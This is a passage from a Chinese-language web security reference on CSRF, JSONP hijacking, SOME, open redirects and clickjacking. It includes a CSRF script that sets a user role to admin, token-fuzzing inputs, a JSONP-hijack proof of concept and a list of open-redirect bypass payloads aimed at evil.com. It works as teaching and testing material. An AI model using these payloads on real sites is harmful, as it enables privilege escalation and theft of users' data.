    ```html
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://www.example.com/api/setrole");
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send('{"role":admin}');
    </script>
    ```

**Bypass 技巧**

- 尝试 fuzz token
    ```
    username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa

    username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab
    username=dapos&password=123456&token=0
    username=dapos&password=123456&token=
    username=dapos&password=123456&
    ```

- POST 转 GET

---

## jsonp劫持

**简介**

JSONP 劫持实际上也算是 CSRF 的一种。当某网站使用 JSONP 的方式来跨域传递一些敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。

JSON 实际应用的时候会有两种传输数据的方式：

- xmlhttp 获取数据方式：
    ```
    {"username":"twosmi1e","password":"test123"}
    ```
    当在前端获取数据的时候，由于数据获取方和数据提供方属于同一个域下面，所以可以使用 xmlhttp 的方式来获取数据，然后再用 xmlhttp 获取到的数据传入自己的 js 逻辑如 eval。

- script 获取数据方式：
    ```
    userinfo={"username":"twosmi1e","password":"test123"}
    ```
    如果传输的数据在两个不同的域，由于在 javascript 里无法跨域获取数据，所以一般采取 script 标签的方式获取数据，传入一些 callback 来获取最终的数据，如果缺乏有效地控制(对 referer 或者 token 的检查)就有可能造成敏感信息被劫持。

<script src="http://www.test.com/userdata.php?callback=userinfo"></script>

**相关文章**
- [jsonp 原理详解——终于搞清楚 jsonp 是啥了](https://blog.csdn.net/hansexploration/article/details/80314948)
- [JSONP 安全攻防技术](https://blog.knownsec.com/2015/03/jsonp_security_technic/)

**相关案例**
- [中国联通某站 jsonp 接口跨域导致信息泄漏并可开通某些套餐 (运营商额外插入功能带来的风险) ](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0172305)
- [京东商城 JSONP+CSRF 导致某处信息泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0121266)
- [迅雷某站 jsonp 劫持漏洞泄漏会话 ID,cookie](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0121639)
- [唯品会某处 JSONP+CSRF 泄露重要信息](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0122755)
- [新浪微博之点击我的链接就登录你的微博(JSONP 劫持)](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0204941)
- [苏宁易购多接口问题可泄露用户姓名、地址、订单商品 (jsonp 案例) ](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0118712)
- [通过 jsonp 可以获得当前用户的 QQ+crsf 刷收听](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-070690)
- [利用 JSONP 劫持可以泄漏 QQ 号](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-065177)
- [京东商城某处 jsonp 接口可泄露任意用户的搜索记录](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044210)
- [新浪微博 JSONP 劫持之点我链接开始微博蠕虫+刷粉丝](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0171499)
- [fanwe O2O 用户密码可劫持 (通用/开源软件 jsonp 劫持案例) ](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0124949)

**简单 POC**
```html
＜script＞
function jsonph(json){
alert(JSON.stringify(json))
  }
＜/script＞

＜script src="https://target.com?callback=jsonph"＞＜/script＞
```

### SOME

> 同源方式执行

**简介**

SOME（Same Origin Method Execution），同源方式执行，不同于 XSS 盗取用户 cookie 为目的，直接劫持 cookie 经行操作，和 CSRF 攻击很类似，不同的是 CSRF 是构造一个请求，而 SOME 则希望脚本代码被执行。

**相关文章**
- [浅析同源方式执行（SOME）攻击](https://www.freebuf.com/articles/web/169873.html)

**靶场**
- [Same Origin Method Execution](https://www.someattack.com/Playground/About)

---

# 钓鱼欺骗

**相关案例**
- [$7.5k Google Cloud Platform organization issue](https://www.ezequiel.tech/2019/01/75k-google-cloud-platform-organization.html)
- [从微信群不良广告到酷我音乐存储型XSS再到乐视url跳转](https://darkless.cn/2019/12/23/kuwomusic-xss/)

## URL跳转漏洞

`Open Redirect`

**相关文章**
- [URL 重定向及跳转漏洞](http://www.pandan.xyz/2016/11/15/url%20%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/)
- [分享几个绕过 URL 跳转限制的思路](https://www.anquanke.com/post/id/94377)
- [浅析渗透实战中url跳转漏洞 ](https://xz.aliyun.com/t/5189)

**相关工具**
- [devanshbatham/OpenRedireX](https://github.com/devanshbatham/OpenRedireX)

**字典**
- https://github.com/No-Github/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_param_Register.txt

**Bypass 技巧**
- Fuzz
    - `/?ref=evil.com`
    - `/?ref=//evil.com`
    - `/?ref=\\evil.com`
    - `/?ref=\/\/evil.com/`
    - `/?ref=/\/evil.com/`
    - `/?ref=evil%E3%80%82com`
    - `/?ref=//evil%00.com`
    - `/?ref=target.com&ref=evil.com`
    - `/?ref=target.com@evil.com`
    - `/?ref=target.com%40evil.com`
    - `/?ref=target.com?evil.com`
    - `/?ref=https://evil.c℀.example.com`
    - `/?ref=target.com/°evil.com`
    - `/?ref=/%0d/evil.com`

- 协议
    - `/?ref=http:evil.com`
    - `/?ref=https:evil.com`

- 白名单
    - `/?ref=baidu.com`
    - `/?ref=baidu.com.evil.com`

---

## 二维码劫持

**相关案例**
- [二维码劫持案例分析](https://www.freebuf.com/vuls/234121.html)

---

## 点击劫持

- [click-jacking](https://www.hacksplaining.com/exercises/click-jacking) - 一个简单的讲解关于点击劫持的网站

**相关案例**
- [Uber XSS + clickjacking](https://www.youtube.com/watch?v=5Gg4t3clwys)
- [Stealing your private documents through a bug in Google Docs](https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/)
